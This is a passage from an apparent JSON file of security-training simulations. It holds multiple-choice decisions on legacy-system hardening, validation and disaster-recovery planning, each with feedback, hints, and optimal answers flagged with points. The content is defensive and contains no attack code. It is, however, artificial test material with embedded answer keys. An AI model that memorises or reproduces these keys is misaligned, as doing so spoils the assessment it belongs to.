            "feedback": "{'short': 'Risk acceptance without compensating controls is insufficient', 'detailed': \"Risk acceptance alone doesn't reduce risk - it just documents who's accountable when something goes wrong. Legacy systems need compensating controls (isolation, monitoring, hardening where possible) in addition to documented acceptance. And there should be a plan to eventually eliminate the risk.\", 'consequence': 'Risk documented but not reduced. Legacy systems remain vulnerable.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Isolate on separate network segment, apply compensating controls, plan for replacement",
            "feedback": "{'short': 'Correct! Contain risk while planning elimination', 'detailed': 'Legacy system approach: isolate (separate network segment, restricted access), compensate (additional monitoring, application whitelisting, enhanced hardening where possible), and plan (timeline for application upgrade or replacement). This reduces risk now while working toward elimination. Document the compensating controls for audit.', 'consequence': 'Risk contained. Monitoring detects issues. Replacement planned.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Immediately decommission all unsupported systems",
            "feedback": "{'short': 'May break critical business applications', 'detailed': \"Legacy systems often support business-critical applications that can't run on newer OS. Immediate decommission could stop business processes. The goal is to reduce risk (isolation, controls) while planning for proper transition. Forced decommission creates business disruption.\", 'consequence': 'Critical applications unavailable. Business disruption.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Purchase extended security updates from Microsoft",
            "feedback": "{'short': \"ESU helps but doesn't solve the problem\", 'detailed': \"Extended Security Updates (ESU) provide continued patches for critical vulnerabilities - helpful for reducing risk. However, ESU is expensive, temporary (ends eventually), and doesn't address all risks of old OS. ESU can be part of the compensating controls but isn't a complete solution. Still need isolation and replacement plan.\", 'consequence': 'Some patches available but expensive and temporary. Still need broader strategy.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you reduce risk from systems that can't be immediately replaced?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Isolate (network segmentation), compensate (additional controls), plan (replacement timeline). Contain risk while working toward elimination."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Defense in Depth Validation",
        "situation": "You've implemented significant improvements. James Morrison asks how you'll verify the security architecture is effective before considering the project complete.\n\n**Question:** How should Pacific validate the hardening program's effectiveness?",
        "options": [
          {
            "id": "A",
            "text": "Review documentation and configuration standards",
            "feedback": "{'short': \"Documentation doesn't prove effectiveness\", 'detailed': \"Documentation shows what SHOULD be configured, not what IS configured or whether it's actually effective. Systems drift from baselines, exceptions accumulate, and controls may not work as expected. Technical validation is needed to verify actual security posture.\", 'consequence': 'Paper compliance but unknown actual security.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Penetration test simulating the original attack path",
            "feedback": "{'short': 'Correct! Validate controls actually prevent the attack', 'detailed': 'Penetration testing the original attack path validates that controls work: Can phishing still get malware execution? Can attackers move laterally? Can they reach OT? This validates the entire defense-in-depth architecture. Include tabletop exercise with incident response team to validate detection and response.', 'consequence': 'Validated security improvement. Known gaps identified. Evidence of program success.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Run vulnerability scans to ensure all systems are hardened",
            "feedback": "{'short': 'Scans show configuration but not defense effectiveness', 'detailed': \"Vulnerability scanning verifies baseline compliance - important for confirming hardening is applied. But scans don't test whether the security architecture actually stops attacks. Penetration testing validates the full attack chain, not just individual configurations.\", 'consequence': 'Know systems are configured correctly but not whether defenses work together.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Monitor for 90 days with no incidents to prove effectiveness",
            "feedback": "{'short': \"Absence of attacks doesn't prove defense\", 'detailed': \"No incidents could mean: good security, OR no attacks during that period. Lack of attacks doesn't validate that defenses would stop an attack. Proactive testing (penetration test) provides evidence that controls work, regardless of whether real attacks occur.\", 'consequence': 'False confidence if there were simply no attacks during monitoring period.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you prove that security controls actually stop attacks?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Penetration testing simulates real attacks to validate defenses. Test the original attack path to prove it's now blocked."
          }
        ]
      },
      {
        "id": "decision_10",
        "sequence": 10,
        "title": "Ongoing Hardening Maintenance",
        "situation": "The initial hardening project is nearing completion. You need to ensure security posture is maintained over time, not just achieved once.\n\n**Question:** What is most critical for maintaining hardening over time?",
        "options": [
          {
            "id": "A",
            "text": "Annual security assessment to check compliance",
            "feedback": "{'short': 'Annual is too infrequent - drift happens continuously', 'detailed': 'Configuration drift happens every day: new systems deployed, changes made, exceptions granted. Annual assessment means up to 12 months of undetected drift. Continuous monitoring catches drift immediately. Annual assessments are valuable but not sufficient alone.', 'consequence': 'Months of drift between assessments. Unknown security posture.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Continuous compliance monitoring with automated baseline validation",
            "feedback": "{'short': 'Correct! Continuous monitoring catches drift immediately', 'detailed': 'Automated continuous monitoring (SCCM compliance baselines, SCAP scanning, cloud security posture management) validates configurations continuously: new systems checked immediately, drift detected in near-real-time, compliance dashboards show current state. Combined with change management and exception tracking, this maintains security posture over time.', 'consequence': 'Drift detected immediately. Continuous visibility into compliance. Sustained security posture.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Training for IT staff on hardening standards",
            "feedback": "{'short': \"Training helps but doesn't ensure compliance\", 'detailed': \"Training ensures IT staff know the standards, but human processes aren't reliable for consistent compliance. Automated enforcement and monitoring ensure baselines are maintained regardless of individual actions. Training is valuable but not the primary control.\", 'consequence': 'Staff trained but configuration drift still possible.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Document all configurations for audit purposes",
            "feedback": "{'short': \"Documentation doesn't maintain security\", 'detailed': \"Documentation is important for audits and reference, but documenting a standard doesn't ensure it's followed. Technical enforcement and continuous monitoring maintain security; documentation supports but doesn't replace those controls.\", 'consequence': 'Well-documented but possibly non-compliant systems.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How do you ensure hardening baselines are maintained over time across thousands of systems?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Continuous compliance monitoring: automated validation against baselines, immediate drift detection, compliance dashboards."
          }
        ]
      }
    ],
    "glossary": {},
    "outcomes": {},
    "max_score": 250,
    "passing_score": 150
  },
  {
    "id": "D3-SIM-005",
    "title": "Resilience and Recovery",
    "domain": 3,
    "type": "SIM",
    "difficulty": "advanced",
    "time_estimate": "50-65 minutes",
    "role": "Business Continuity Architect",
    "organization": {
      "name": "Continental Logistics Corporation",
      "industry": "Transportation and Logistics"
    },
    "introduction": "Continental Logistics' summer outage exposed critical gaps in business continuity planning. The company's 24/7 operations and contractual SLAs with major retailers mean downtime directly translates to revenue loss and customer defection. As the newly appointed Business Continuity Architect, you're tasked with designing a resilient architecture that can withstand site failures, cyber attacks, and natural disasters. Patricia Vance has made it clear: the board expects a fundamental transformation, not incremental improvements.",
    "learning_objectives": [
      "Explain the importance of resilience and recovery in security architecture",
      "Explain the importance of change management processes and the impact to security"
    ],
    "decision_points": [
      {
        "id": "decision_1",
        "sequence": 1,
        "title": "Defining Recovery Objectives",
        "situation": "Continental has never formally defined RTO and RPO for critical systems. During the outage, there was confusion about recovery priorities. Patricia asks you to establish recovery objectives.\n\n**Question:** How should RTO and RPO be determined for Continental's systems?",
        "options": [
          {
            "id": "A",
            "text": "IT should define RTO/RPO based on technical recovery capabilities",
            "feedback": "{'short': 'RTO/RPO are business decisions, not technical', 'detailed': \"IT knows what's technically achievable, but RTO/RPO must be driven by business impact. A system IT can recover in 24 hours might need 1-hour RTO based on revenue loss and SLAs. Business leaders must define requirements based on impact; IT determines how to meet them.\", 'consequence': 'Technical-driven objectives may not match business needs.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Business impact analysis driving RTO/RPO with cost-benefit for achieving each tier",
            "feedback": "{'short': 'Correct! Business impact determines requirements, cost informs decisions', 'detailed': 'BIA identifies: revenue impact per hour, SLA penalties, operational dependencies, and regulatory requirements. This determines WHAT RTO/RPO is needed. Cost analysis shows WHAT IT COSTS to achieve each tier. Business leaders make informed decisions balancing impact against investment. IT then implements to meet objectives.', 'consequence': 'Recovery objectives aligned with business needs. Investment justified by impact reduction.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Set the same RTO/RPO for all systems to simplify recovery",
            "feedback": "{'short': 'One-size-fits-all wastes money or under-protects', 'detailed': 'Systems have different business impact. Applying the most stringent RTO/RPO to everything is expensive and unnecessary. Applying the least stringent puts critical systems at risk. Tiered approach matches investment to impact.', 'consequence': 'Either over-invest in non-critical systems or under-protect critical ones.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Use industry benchmarks for logistics companies",
            "feedback": "{'short': \"Benchmarks help but don't replace business analysis\", 'detailed': \"Industry benchmarks provide reference points, but Continental's specific SLAs, customer contracts, and revenue model determine its requirements. A competitor with different contracts may have different needs. BIA captures Continental-specific requirements.\", 'consequence': 'Generic objectives may not match specific business commitments.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "Who understands the business impact of downtime - IT or business leaders?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Business impact analysis quantifies downtime cost. RTO/RPO should be set based on impact, with cost-benefit for different recovery tiers."
          }
        ]
      },
      {
        "id": "decision_2",
        "sequence": 2,
        "title": "High Availability Architecture",
        "situation": "The TMS system is revenue-critical with $125K/hour impact and strict customer SLAs. Currently it runs only in Chicago with no standby. You need to design the HA architecture for TMS.\n\n**Question:** What high availability architecture should be implemented for TMS?",
        "options": [
          {
            "id": "A",
            "text": "Active-active across Chicago and cloud DR site",
            "feedback": "{'short': 'Active-active is complex and may not be necessary', 'detailed': 'Active-active provides near-zero RTO but requires: application redesign for multi-site operation, synchronous data replication (latency-constrained), complex conflict resolution, and highest cost. For TMS with 4-hour MTPD, active-passive hot standby likely meets needs at lower complexity.', 'consequence': 'Highest cost and complexity. May be over-engineering for requirements.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Active-passive hot standby with asynchronous replication and automated failover",
            "feedback": "{'short': 'Correct! Meets RTO requirements with manageable complexity', 'detailed': 'Hot standby provides: systems running and ready at DR site, asynchronous replication (minutes of data lag, acceptable for most scenarios), automated failover (15-30 minute RTO achievable), and proven architecture pattern. Meets the <1 hour RTO needed for $125K/hour impact without active-active complexity.', 'consequence': 'RTO achievable within requirements. Balanced complexity and cost.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Warm standby with 4-hour recovery capability",
            "feedback": "{'short': '4-hour RTO equals MTPD - no margin for error', 'detailed': 'TMS has 4-hour MTPD (Maximum Tolerable Period of Disruption). A 4-hour RTO leaves no margin - any complication extends beyond tolerable period. RTO should be significantly less than MTPD to account for real-world recovery challenges.', 'consequence': 'No safety margin. Likely to exceed MTPD during real incident.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Improve Chicago resilience - dual power, better generators - avoid DR site cost",
            "feedback": "{'short': \"Single site can't protect against all scenarios\", 'detailed': \"Improved local resilience is valuable but doesn't protect against: major disasters (fire, flood), prolonged regional outages, or incidents affecting the building. Geographic redundancy is essential for critical systems. Defense in depth means both local resilience AND remote DR.\", 'consequence': 'Still single point of failure at site level.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What architecture provides RTO well under MTPD without unnecessary complexity?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Active-passive hot standby: systems running at DR, async replication, automated failover. Achieves 15-60 minute RTO. Active-active is more complex than needed."
          }
        ]
      },
      {
        "id": "decision_3",
        "sequence": 3,
        "title": "Backup Strategy",
        "situation": "The incident revealed that backups had never been tested for recoverability. Additionally, ransomware is a major concern - attackers increasingly target backups. You need to design the backup strategy.\n\n**Question:** What backup strategy should Continental implement?",
        "options": [
          {
            "id": "A",
            "text": "Daily full backups to cloud storage with 30-day retention",
            "feedback": "{'short': 'Missing key elements - immutability, offsite, and testing', 'detailed': 'Daily full backups to cloud is a start but: no immutable copy (ransomware can encrypt cloud backups if credentials compromised), cloud-only violates 3-2-1 (two media types), and no mention of testing. Modern backup strategy must address ransomware specifically.', 'consequence': 'Backups may be encrypted in ransomware attack. Single media type risk.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "3-2-1-1-0 strategy: three copies, two media types, one offsite, one immutable/offline, zero errors on restore testing",
            "feedback": "{'short': 'Correct! Comprehensive strategy addressing ransomware and recoverability', 'detailed': '3-2-1-1-0 addresses all concerns: 3 copies (production + 2 backups) for redundancy, 2 media types (disk + tape or cloud) for diversity, 1 offsite for geographic separation, 1 immutable/offline for ransomware protection, 0 errors on restore testing to verify recoverability. This is the modern best practice for backup strategy.', 'consequence': 'Protected against ransomware, hardware failure, and site loss. Verified recoverability.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Continuous data replication to DR site only - backups are outdated",
            "feedback": "{'short': 'Replication alone is not backup', 'detailed': 'Replication provides availability but not protection against: data corruption (corrupted data replicates), ransomware (encryption replicates), accidental deletion (deletion replicates). Backups provide point-in-time recovery. Both replication and backup are needed.', 'consequence': 'No point-in-time recovery. Corruption/ransomware affects both sites.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Hourly snapshots with weekly tape rotation to offsite storage",
            "feedback": "{'short': 'Good elements but missing immutability and testing', 'detailed': 'Hourly snapshots provide good RPO, weekly tape provides offsite. But: snapshots alone may be on same storage (not protected from storage failure), no immutable copy mentioned, and no restore testing. These are good components but not complete strategy.', 'consequence': 'Some protection but gaps in ransomware resilience and verified recovery.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What backup strategy protects against ransomware and ensures backups actually work?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "3-2-1-1-0: three copies, two media, one offsite, one immutable/offline, zero restore errors. Addresses ransomware with immutable copy; addresses recoverability with testing."
          }
        ]
      },
      {
        "id": "decision_4",
        "sequence": 4,
        "title": "DR Site Selection",
        "situation": "The Dallas cold site is inadequate. You need to recommend a new DR approach. Options include a new physical site, colocation, or cloud. Geographic and capability factors must be considered.\n\n**Question:** What DR site strategy should Continental implement?",
        "options": [
          {
            "id": "A",
            "text": "Build a new company-owned data center in Dallas",
            "feedback": "{'short': 'Long lead time and high capital expense', 'detailed': 'Building a data center takes 18-24 months and significant capital. Continental needs DR capability now, not in two years. The initiative timeline is 18 months - building a DC would consume the entire timeline before providing any DR capability. Faster options available.', 'consequence': 'No DR improvement during project timeline.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Cloud-based DR in Azure East US region with hybrid architecture",
            "feedback": "{'short': 'Correct! Fast deployment, elastic capacity, geographic separation', 'detailed': \"Cloud DR provides: rapid deployment (weeks not years), elastic capacity (pay for what you use, scale for failover), geographic separation (East US from Chicago), and proven platform. Hybrid approach maintains existing Chicago investment while adding cloud DR. Azure's DR services (Site Recovery, Backup) accelerate implementation.\", 'consequence': 'DR capability deployed quickly. Scalable capacity. Geographic resilience.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Colocation in Phoenix with replicated infrastructure",
            "feedback": "{'short': 'Valid option but slower and less flexible than cloud', 'detailed': 'Colocation provides good DR capability but: requires hardware procurement and deployment (months), fixed capacity (over-provision or under-capacity), and ongoing facility costs. Cloud provides faster deployment and elastic capacity. Colocation is a valid choice for steady-state but slower for initial deployment.', 'consequence': 'Longer time to DR capability. Fixed capacity.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Multi-cloud DR across AWS and Azure for platform diversity",
            "feedback": "{'short': 'Adds complexity without proportional benefit', 'detailed': 'Multi-cloud provides platform diversity but: doubles the complexity (two platforms to learn, integrate, operate), increases skill requirements, and complicates data consistency. For DR (not day-to-day), single cloud with multi-region provides similar geographic resilience with less complexity.', 'consequence': 'Operational complexity. Skill requirements. Limited benefit for DR use case.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What option provides fastest time-to-DR with geographic separation and scalable capacity?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Cloud DR: rapid deployment, elastic capacity, geographic options. Hybrid maintains existing investment. Multi-cloud adds complexity without proportional benefit for DR."
          }
        ]
      },
      {
        "id": "decision_5",
        "sequence": 5,
        "title": "Power Resilience",
        "situation": "The Chicago outage was caused by generator fuel exhaustion. The current fuel contract guarantees 8-hour delivery, but the outage lasted 18 hours. You need to improve power resilience at Chicago.\n\n**Question:** What is the MOST critical power resilience improvement for Chicago?",
        "options": [
          {
            "id": "A",
            "text": "Add second generator for N+1 redundancy",
            "feedback": "{'short': \"N+1 generators help but doesn't address fuel issue\", 'detailed': \"N+1 generator redundancy protects against generator failure but doesn't help if fuel runs out - both generators run out of fuel at the same time. The root cause was fuel exhaustion, not generator failure. Address the fuel issue first.\", 'consequence': 'Still run out of fuel during extended outage.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Increase fuel storage capacity and secure priority fuel delivery contract",
            "feedback": "{'short': 'Correct! Addresses the root cause of the outage', 'detailed': 'The outage was caused by fuel exhaustion. Solution: increase on-site fuel capacity (48-72 hours minimum), secure priority fuel delivery contract with guaranteed response time regardless of conditions, and maintain minimum fuel levels. This directly addresses what caused the failure.', 'consequence': 'Extended runtime on generator. Priority fuel delivery ensures replenishment.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Install dual utility feeds from different substations",
            "feedback": "{'short': \"Helps but doesn't address generator fuel issue\", 'detailed': \"Dual utility feeds reduce the chance of utility outage (substations can fail independently). However, in a regional grid failure (like the heat wave), both feeds may lose power. Generators with adequate fuel remain essential. Dual feed is valuable but doesn't solve the fuel problem.\", 'consequence': 'Better utility resilience but same generator fuel gap.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Migrate critical systems to cloud to reduce on-premises dependency",
            "feedback": "{'short': \"Valid strategy but doesn't address existing site\", 'detailed': 'Cloud migration reduces on-premises dependency long-term. But Continental still needs the Chicago site operational, and cloud migration takes time. Fixing the fuel issue is immediate and addresses the specific root cause. Both are needed - fix fuel now, migrate over time.', 'consequence': \"Cloud helps long-term but doesn't fix immediate Chicago vulnerability.\"}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What was the root cause of the power failure - generator malfunction or fuel supply?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Fuel exhaustion was the root cause. Increase fuel capacity (48-72 hours), priority fuel delivery contract, minimum fuel levels."
          }
        ]
      },
      {
        "id": "decision_6",
        "sequence": 6,
        "title": "DR Testing Strategy",
        "situation": "Continental has never tested DR failover. You need to establish a testing program that validates recoverability without unacceptable risk to production operations.\n\n**Question:** What DR testing approach should Continental implement?",
        "options": [
          {
            "id": "A",
            "text": "Annual tabletop exercise with key stakeholders",
            "feedback": "{'short': 'Tabletops validate procedures but not technical recovery', 'detailed': \"Tabletop exercises are valuable for validating procedures, decision-making, and communication - but they don't prove systems actually recover. Technical testing is needed to validate that backups restore, systems start, and failover works. Tabletops complement but don't replace technical tests.\", 'consequence': 'Procedures validated but technical recovery unproven.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Progressive testing: quarterly parallel tests with annual full failover for critical systems",
            "feedback": "{'short': 'Correct! Validates recovery with appropriate frequency and risk', 'detailed': 'Progressive testing provides validation at multiple levels: parallel tests (recover at DR while production runs) validate technical capability without production risk, conducted quarterly. Full failover tests (actually switch production to DR) prove true RTO, conducted annually for critical systems with planned maintenance window. This validates recovery without excessive risk.', 'consequence': 'Recovery capability validated. True RTO measured. Manageable risk.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Monthly full failover tests to ensure readiness",
            "feedback": "{'short': 'Too frequent - excessive risk and disruption', 'detailed': \"Full failover tests carry risk of extended outage if problems occur. Monthly is too frequent - each test risks production impact. Additionally, monthly testing consumes significant operational time and may lead to 'test fatigue' where tests become routine rather than rigorous. Quarterly or annual full tests are more appropriate.\", 'consequence': 'Excessive production risk. Operational burden.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Rely on cloud provider's guaranteed availability - no testing needed",
            "feedback": "{'short': \"Cloud availability doesn't guarantee YOUR recovery works\", 'detailed': 'Cloud provider SLAs cover their infrastructure availability, not your application recovery. Failover automation, data synchronization, application startup, and configuration all must be tested. YOUR recovery process must be validated regardless of underlying platform reliability.', 'consequence': 'Cloud may be available but your systems may not recover correctly.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What testing approach validates technical recovery while managing production risk?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Parallel tests (recover at DR while production runs) quarterly. Full failover tests annually for critical systems. Validates recovery with manageable risk."
          }
        ]
      },
      {
        "id": "decision_7",
        "sequence": 7,
        "title": "DR Capacity Planning",
        "situation": "The cloud DR site needs capacity planning. Full production capacity at DR is expensive but provides full performance during failover. Reduced capacity saves money but may impact operations.\n\n**Question:** What capacity model should Continental use for DR?",
        "options": [
          {
            "id": "A",
            "text": "100% capacity at DR matching production exactly",
            "feedback": "{'short': 'Expensive - paying for idle capacity', 'detailed': 'Full capacity at DR means paying for resources that sit idle during normal operations. For cloud DR, this eliminates the cost benefit of elastic resources. Some reduction or elastic scaling is typically appropriate, especially for cloud where capacity can be added quickly.', 'consequence': 'Highest cost. Paying for unused capacity.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Baseline capacity with elastic scaling to full capacity on failover",
            "feedback": "{'short': 'Correct! Balances cost with recovery capability', 'detailed': \"Elastic capacity model: maintain baseline at DR (databases, critical services, reduced compute), scale up automatically on failover trigger. Cloud enables this - you don't pay for peak capacity when not needed. Include warm-up time in RTO calculations. Pre-provision reservations or capacity pools for guaranteed scaling.\", 'consequence': 'Cost-effective. Capacity available when needed. Leverages cloud elasticity.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "50% capacity with load shedding of non-critical functions on failover",
            "feedback": "{'short': \"May be acceptable but doesn't leverage cloud elasticity\", 'detailed': \"Fixed reduced capacity requires deciding what to shed during failover - complexity during crisis. With cloud DR, elastic scaling provides full capacity when needed without ongoing cost. Load shedding is appropriate for some scenarios but shouldn't be the primary strategy when elasticity is available.\", 'consequence': 'Added complexity during failover. Degraded experience when full capacity available via scaling.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Minimal capacity - provision only when disaster declared",
            "feedback": "{'short': 'Provisioning time extends RTO significantly', 'detailed': \"Starting from near-zero means: VM provisioning time, database restore time, configuration time, and validation time all add to RTO. For critical systems with hour-level RTO, this approach likely can't meet requirements. Databases and stateful services especially need pre-provisioned resources.\", 'consequence': 'Extended RTO from provisioning time. May not meet recovery objectives.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "How can cloud elasticity be leveraged to balance DR cost with recovery capability?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Baseline capacity (databases, critical services) with elastic scaling to full capacity on failover. Balances ongoing cost with rapid scale-up."
          }
        ]
      },
      {
        "id": "decision_8",
        "sequence": 8,
        "title": "Recovery Documentation",
        "situation": "During the incident, recovery was ad-hoc because there were no documented procedures. Even experienced staff struggled with unfamiliar recovery steps under pressure. You need to establish recovery documentation.\n\n**Question:** What is MOST important for effective recovery documentation?",
        "options": [
          {
            "id": "A",
            "text": "Detailed technical runbooks with step-by-step commands for each system",
            "feedback": "{'short': 'Correct! Detailed procedures enable consistent recovery', 'detailed': \"Under crisis pressure, even experienced staff make mistakes or forget steps. Detailed runbooks provide: specific commands and actions (not 'restore the database' but the actual commands), expected results at each step, decision points when judgment needed, and rollback procedures if steps fail. Runbooks enable consistent recovery regardless of who performs it.\", 'consequence': 'Any trained staff can execute recovery. Consistent process. Fewer errors under pressure.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "High-level recovery strategy document for management",
            "feedback": "{'short': \"Management overview doesn't enable technical recovery\", 'detailed': \"Management needs situational awareness and decision points, but the people actually performing recovery need step-by-step technical guidance. High-level strategy is valuable for communication and decision-making but doesn't help the engineer restoring the database at 3 AM.\", 'consequence': 'Management informed but technical staff improvising.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Vendor documentation and knowledge base articles",
            "feedback": "{'short': 'Vendor docs are generic, not environment-specific', 'detailed': 'Vendor documentation covers how products work generically, not your specific environment: your server names, your configuration, your dependencies. Recovery procedures must be customized to your environment. Vendor docs are reference, not procedures.', 'consequence': 'Generic guidance but environment-specific steps missing.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Automation scripts that perform recovery without human intervention",
            "feedback": "{'short': 'Automation is valuable but still needs documentation', 'detailed': \"Automated failover is excellent when it works. But automation can fail, scenarios may vary, and manual intervention may be needed. Documentation of what automation does, how to monitor it, and how to manually complete if automation fails is essential. Automation complements, doesn't replace documentation.\", 'consequence': 'Dependent on automation working. No fallback if automation fails.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
            "text": "What documentation enables consistent recovery execution under crisis pressure?"
          },
          {
            "level": 2,
            "cost": 5,
            "text": "Detailed runbooks with step-by-step commands, expected results, decision points, and rollback procedures. Specific to your environment, not generic."
          }
        ]
      },
      {
        "id": "decision_9",
        "sequence": 9,
        "title": "Resilience Metrics and Governance",
        "situation": "Patricia wants ongoing visibility into resilience posture, not just a one-time project. You need to establish metrics and governance for the resilience program.\n\n**Question:** What is the MOST important ongoing metric for resilience?",
        "options": [
          {
            "id": "A",
            "text": "DR site uptime percentage",
            "feedback": "{'short': \"DR uptime doesn't prove recovery works\", 'detailed': \"DR site can be 'up' without actually being able to recover production workloads. Uptime measures availability of infrastructure, not recovery capability. You need to test actual recovery to validate capability.\", 'consequence': 'DR infrastructure running but recovery capability unvalidated.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "B",
            "text": "Validated RTO - measured recovery time from tested failovers",
            "feedback": "{'short': 'Correct! Tested RTO proves actual recovery capability', 'detailed': 'Validated RTO from actual tests is the gold standard: it proves you can actually recover in the expected time. Measure and track RTO from each test, compare to objectives, identify gaps. This directly measures what matters - can you recover within requirements? Include backup restore testing to validate RPO as well.', 'consequence': 'Proven recovery capability. Clear gap identification. Evidence-based confidence.'}",
            "is_optimal": true,
            "points": 25,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "C",
            "text": "Backup success rate",
            "feedback": "{'short': \"Backup success doesn't prove recoverability\", 'detailed': 'Backups can complete successfully but still not be recoverable (corruption, missing data, wrong configuration). Backup success rate is important but restore testing is what validates recoverability. Track both backup success and restore validation.', 'consequence': 'Know backups complete but not if they work.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          },
          {
            "id": "D",
            "text": "Budget spent on resilience program",
            "feedback": "{'short': \"Spending doesn't equal capability\", 'detailed': 'Budget spent measures investment, not outcomes. You can spend millions and still not be resilient if money is spent on wrong things or implementation is poor. Outcome metrics (validated RTO, tested recovery) matter more than input metrics (budget spent).', 'consequence': 'Know spending but not actual resilience.'}",
            "is_optimal": false,
            "points": 5,
            "learning_note": "",
            "consequences": {}
          }
        ],
        "hints": [
          {
            "level": 1,
            "cost": 2,
